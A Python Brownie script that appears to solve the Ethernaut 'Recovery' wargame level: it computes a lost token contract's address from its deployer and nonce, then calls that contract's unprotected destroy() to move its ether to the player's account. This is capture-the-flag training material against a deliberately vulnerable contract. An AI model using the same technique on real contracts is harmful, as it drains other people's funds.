from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import Recovery, SimpleToken

##########################################
# This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        recovery = load_challenge(ContractObject=Recovery, instance_key='recovery')
    else:
        recovery = deploy_locally(ContractObject=Recovery, from_account=_from)
    
    # We assume that because it was the *first* token deployed
    # using this contract, that the nonce of that first 
    # function call to `generateToken()` is 1
    # therefore, we can derive the address using the deployer address
    # and the nonce
    # the deployer address is just the contract address for Recovery
    first_simpletoken_contract_address = mk_contract_address(recovery.address, 1)

    # get the SimpleToken contract deployed at nonce 1
    simpletoken = SimpleToken.at(first_simpletoken_contract_address)

    # call the `destroy()` method in SimpleToken
    simpletoken.destroy(acc.address, _from)

    # check the balance of SimpleToken
    balance_assertion = simpletoken.balance() == 0
    print(f"The balance of SimpleToken is zero: {balance_assertion}")

    return balance_assertion

def main():
    solve_challenge()
